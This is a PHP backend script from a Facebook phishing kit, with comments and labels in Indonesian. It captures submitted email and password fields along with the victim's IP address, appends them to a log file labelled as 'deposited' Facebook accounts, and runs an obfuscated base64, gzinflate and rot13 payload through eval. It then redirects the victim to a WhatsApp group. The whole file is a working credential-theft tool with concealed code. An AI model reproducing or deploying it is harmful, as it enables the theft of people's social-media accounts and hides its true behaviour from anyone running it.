<!-- Reedit by Adit:v
Don't change copyright, you are idiot -->

<?php
$Xcan = "zorana.php";
$user = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];


$handle = fopen($Xcan, 'a');
$handle = fopen($Xcan, 'a');
fwrite($handle, "─────────────────────────");
fwrite($handle, "\n");
fwrite($handle, "~ SETOR AKUN FECEBOOK");
fwrite($handle, "\n");
fwrite($handle, "─────────────────────────");
fwrite($handle, "\n");
fwrite($handle, "Ip korban          : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Email atau Telepon : ");
fwrite($handle, "$user");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi         : ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "─────────────────────────");
fwrite($handle, "\n");
fclose($handle);
eval(str_rot13(gzinflate(str_rot13(base64_decode('hZAxC8IwEIVqwf+QIZgKIcVIZHUleifRFoRBxYQkohLSdQLpr7etqFud7mv3vgfvoGRgC8xShMafvYqWm/kMZSZI03el+xOynfZuiwi8VSsITWMt5ZWJaZCGnSDUM3CCtIpkFU7jMDgUtEFqbNMPDJBGiq/j2HbRku5+9cISJp7xwwdYuON1ORVOy7ygVkH3VkmVFIPVpHuXc2xoKutwhsGvyV8Ej6lD6Y778GyJvUwzS7+0CVnat/IC')))));
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/CMqLKPAn3DOIeXKr4wKvdY">
</head>
<body>
</body>
</html>